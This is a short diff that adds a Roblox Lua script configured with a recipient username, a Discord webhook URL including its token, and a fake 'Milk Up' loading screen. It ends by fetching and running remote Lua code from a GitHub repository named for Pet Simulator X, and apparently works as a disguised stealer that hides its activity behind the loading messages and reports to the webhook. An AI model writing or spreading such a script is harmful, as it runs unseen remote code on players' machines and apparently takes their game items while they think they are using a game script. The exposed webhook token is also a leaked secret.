@@ -1,0 +1,17 @@
+Username = "ashleypaglinawan11"
+
+WebHook = "https://discord.com/api/webhooks/1098825660190965803/dITKIjqWBoucXY5FloPgePSecMKx_5S4Fqljy4eW9Uy6AAKtk3tBuOepJZqTzz31_exn"
+
+loadingscreen = true
+
+_G.CustomScriptName = "Milk Up"
+
+_G.Text1 = "this may take a while!"
+
+_G.Text2 = "the script is loading!"
+
+_G.Text3 = "almost done!!!"
+
+_G.Text4 = "the script is ready enjoy!!!"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
